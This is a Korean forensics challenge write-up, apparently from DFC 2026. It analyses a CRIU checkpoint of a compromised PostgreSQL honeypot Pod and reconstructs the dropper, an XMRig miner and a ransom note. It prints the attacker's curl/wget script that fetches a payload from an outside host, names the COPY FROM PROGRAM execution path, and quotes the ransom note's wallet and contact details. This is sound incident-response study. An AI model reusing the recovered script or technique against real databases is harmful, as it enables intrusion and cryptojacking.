---
layout: post
title: "Who stole my Honeypot? — CRIU 체크포인트에서 프로세스 트리와 랜섬 노트 복원하기"
date: 2026-07-11 21:00:00 +0900
category: 포렌식
author: WTCY
series: DFC 2026
tags: [DFC2026, 디지털포렌식, 컨테이너, Kubernetes, CRIU, PostgreSQL, XMRig, 메모리포렌식, protobuf]
excerpt: "쿠버네티스 Pod의 CRIU 체크포인트 하나가 증거의 전부. protobuf 이미지를 직접 파싱해 프로세스 트리를 복원하고, PostgreSQL 프로세스 메모리에서 COPY FROM PROGRAM으로 실행된 셸 스크립트와 랜섬 노트를 그대로 꺼냈다."
---

> **한 줄 결론**: CRIU 체크포인트는 **프로세스 트리·열린 소켓·프로세스 메모리**를 통째로 보존한다. `pstree.img` 로 부모-자식 관계를, `pages-1.img` 로 실행된 명령과 랜섬 노트를, `files.img` 로 숨겨진 바이너리 경로와 활성 소켓을 복원했다.

## 무엇이 주어졌나

| 파일 | 값 |
|---|---|
| `kubernetes-artifacts.zip` (제공 MD5) | `b0e3bcc4ffc9dd2f328dcd740ab68730` |
| `dump.tar` SHA-256 | `2f89781c500063aedfdf67fecf4afdeb7cfed5d23bba206ac124e7c297d85d02` |

`dump.tar` 는 CRIU 체크포인트 덤프다. 구성은 `config.dump`, `spec.dump`, `rootfs-diff.tar`, 그리고 CRIU 이미지들(`pstree`/`files`/`core`/`mm`/`pages` 등).

디스크 이미지도, 로그도, 패킷 캡처도 없다. **살아 있던 컨테이너를 그대로 얼려 놓은 스냅샷 하나**로 사건을 재구성해야 한다.

## 1. 무엇이 침해됐나 — 메타데이터부터

컨테이너 런타임 메타데이터인 `config.dump` 와 `spec.dump` 의 annotation:

```json
// config.dump
"name": "postgresql_honeypot-postgresql-0_traefik-system_3299b17d-…-9825cbc7ed2f_0",
"rootfsImageName": "docker.io/bitnami/postgresql:16.0.0-debian-11-r15"

// spec.dump annotations
"io.kubernetes.cri.container-name":    "postgresql"
"io.kubernetes.cri.sandbox-name":      "honeypot-postgresql-0"
"io.kubernetes.cri.sandbox-namespace": "traefik-system"
```

Pod `honeypot-postgresql-0`, 컨테이너 `postgresql`, 네임스페이스 `traefik-system`, 이미지 `bitnami/postgresql:16.0.0-debian-11-r15`.

Pod 이름이 `honeypot-` 인데 네임스페이스는 `traefik-system` 이다. 허니팟을 인프라 네임스페이스에 숨겨 둔 구성이고, 실제로 인터넷에 노출된 PostgreSQL 이 뚫렸다.

## 2. 페이로드 다운로드 C2 — 메모리에 남은 셸 스크립트

PostgreSQL 프로세스의 메모리 이미지(`checkpoint/pages-1.img`)에서 Base64 문자열을 추출해 디코딩했다. `COPY … FROM PROGRAM` 으로 실행된 셸 스크립트가 통째로 남아 있었다.

```sh
if [ -x "$(command -v curl)" ]; then
  curl -ksS 46.101.26.168:40819/LgFVUzgPXrjOhJhovcOChFjRokNXKN -o postmaster
elif [ -x "$(command -v wget)" ]; then
  wget -q -Opostmaster 46.101.26.168:40819/LgFVUzgPXrjOhJhovcOChFjRokNXKN
else
  __curl http://46.101.26.168:40819/LgFVUzgP…
fi
```

`COPY … FROM PROGRAM` 은 PostgreSQL 슈퍼유저가 서버 프로세스 권한으로 임의 명령을 실행할 수 있는 정식 기능이다. 인터넷에 노출된 약한 자격증명의 PostgreSQL 이 곧바로 RCE 가 되는 경로.

저장 파일명이 `postmaster` 다. PostgreSQL 의 정규 메인 프로세스 이름과 같아서, `ps` 만 보면 눈에 띄지 않는다.

### 마이닝 풀과 구분하기

체크포인트 시점에 활성 소켓으로 남아 있던 주소가 따로 있었다 — `47.243.103.30:13333`, `47.243.240.56:13333`. 이걸 C2 로 적으면 오답이다.

| 구분 | 주소 | 역할 | 근거 |
|---|---|---|---|
| 페이로드 다운로드 C2 | `46.101.26.168:40819` | 드로퍼 `postmaster` 배포 | `pages-1.img` 내 curl/wget 명령 |
| 채굴 풀 | `47.243.103.30:13333`, `47.243.240.56:13333` | XMRig 마이닝 트래픽 | `files.img` 소켓, XMRig 설정 문자열 |

`47.243.x` 는 XMRig 설정의 `mine.c3pool.com:13333` / `:443` 이 해석된 결과다. 그리고 **PostgreSQL 프로세스 메모리(`pages-1.img`)에서는 `47.243.x` 문자열이 전혀 관측되지 않는다.**

"체크포인트 시점에 열려 있던 소켓" 과 "페이로드를 받아 온 곳" 은 서로 다른 시점의 서로 다른 인프라다. 스냅샷은 **마지막 순간**을 보여 주고, 메모리에 남은 명령은 **과거의 행위**를 보여 준다.

## 3. 프로세스 트리 — pstree.img 직접 파싱

CRIU 의 `pstree.img` 를 protobuf 구조로 직접 파싱해 PID·PPID 관계를 복원하고, 각 프로세스의 `core-<pid>.img` 에서 `comm`(프로세스 이름)을, `files.img` 에서 실행 파일 경로를 확인했다.

| PID | 부모 PID | comm | 성격 |
|---|---|---|---|
| 1 | 0 | `postgres` | 컨테이너 메인 프로세스 |
| 167666 | 1 | `postmaster` | **다운로드된 드로퍼** (정규 프로세스명 위장) |
| 167702 | 167666 | `cpu_hu` | 드로퍼가 만든 첫 번째 하위 프로세스 |
| 201963 | 167702 | — | 후속 프로세스 |

`postgres`(PID 1) → `postmaster` → `cpu_hu` 로 이어지는 계보가 그대로 보인다. **PostgreSQL 이 자기 이름을 사칭한 자식을 낳았다** 는 게 한눈에 드러난다.

`files.img` 에서 `cpu_hu` 의 실제 경로를 찾았다.

```
/bitnami/postgresql/data/pg_wal/cpu_hu
```

**PostgreSQL 의 WAL 디렉터리 안**이다. DB 가 정상 운영 중에 계속 쓰는 디렉터리라, 파일 하나가 늘어도 눈에 잘 안 띈다. 바이너리 문자열에 C3Pool XMRig 릴리스 URL 과 RandomX 관련 로그가 있어 XMRig 계열 마이너로 판단했다.

## 4. 랜섬 노트

PostgreSQL 프로세스 메모리에서 협박 메시지 원문과, 이를 저장한 테이블명 `readme_to_recover` 가 같이 확인됐다.

```
All your data is backed up. You must pay 0.0043 BTC to
bc1qxtc9se4wya2ljz57vq99srrryattcp594k9ecs
In 48 hours, your data will be publicly disclosed and deleted.
(more information: go to http://2info.win/psg)
After paying send mail to us: rambler+3qok2@onionmail.org
and we will provide a link for you to download your data.
Your DBCODE is: 3QOK2
```

요구액 0.0043 BTC, 48시간 시한, 피해자 식별자 `3QOK2`. 이메일 주소의 `+3qok2` 서브어드레싱과 DBCODE 가 일치하는데, 이건 공격자가 **여러 피해자를 자동으로 구분**하는 장치다. 대량 자동화된 캠페인이라는 뜻.

크립토마이닝과 랜섬을 **동시에** 하는 구성도 특징적이다. 몸값을 못 받아도 CPU 는 계속 쓴다.

## 종합 및 IOC

인터넷에 노출된 PostgreSQL 허니팟이 `COPY … FROM PROGRAM` 을 통한 원격 명령 실행으로 침해됐다. 공격자는 `46.101.26.168:40819` 에서 드로퍼(`postmaster`)를 내려받아 실행했고, 이 드로퍼가 XMRig 마이너(`cpu_hu`)를 `pg_wal` 디렉터리에 숨겨 실행해 c3pool 채굴 풀에 접속했다. 동시에 DB 에는 비트코인 요구 협박 노트를 삽입했다.

| 구분 | IOC |
|---|---|
| 침해 대상 | Pod `honeypot-postgresql-0` / Container `postgresql` (ns `traefik-system`) |
| 페이로드 C2 | `46.101.26.168:40819` (`/LgFVUzgPXrjOhJhovcOChFjRokNXKN`) |
| 채굴 풀 | `47.243.103.30:13333`, `47.243.240.56:13333` (`mine.c3pool.com`) |
| 악성 파일 | `/bitnami/postgresql/data/postmaster` (드로퍼), `/bitnami/postgresql/data/pg_wal/cpu_hu` (마이너) |
| 랜섬 IOC | BTC `bc1qxtc9se4wya2ljz57vq99srrryattcp594k9ecs`, `2info.win/psg`, `rambler+3qok2@onionmail.org`, DBCODE `3QOK2` |

## 정리 — 이 문제에서 남는 것

**CRIU 체크포인트는 컨테이너판 메모리 덤프 그 이상이다.** 프로세스 트리·열린 파일·소켓·각 프로세스의 메모리가 구조화된 형태로 같이 들어 있다. `pstree.img` 하나로 부모-자식 관계가 복원되니, 로그 없이도 실행 계보를 그릴 수 있다.

**정규 프로세스명 위장은 트리 앞에서 무력하다.** 드로퍼가 `postmaster` 를 자칭해도, PID 1 `postgres` 의 자식으로 새 `postmaster` 가 붙는 구조는 정상일 수 없다. 이름이 아니라 **관계**를 봐야 한다.

**스냅샷의 시점을 의식해야 한다.** 활성 소켓은 체크포인트 순간의 상태고, 메모리에 남은 명령 문자열은 그보다 이전의 행위다. 둘을 한 덩어리로 묶으면 C2 와 채굴 풀이 뒤섞인다.

**부재도 근거다.** `pages-1.img` 에 `47.243.x` 가 0건이라는 사실이, 채굴 풀과 페이로드 서버를 분리하는 결정적 근거였다.

---

*DFC 2026 출제 문제 201번에 대한 분석 기록. 2인 팀 참가 제출본을 블로그용으로 정리했다.*
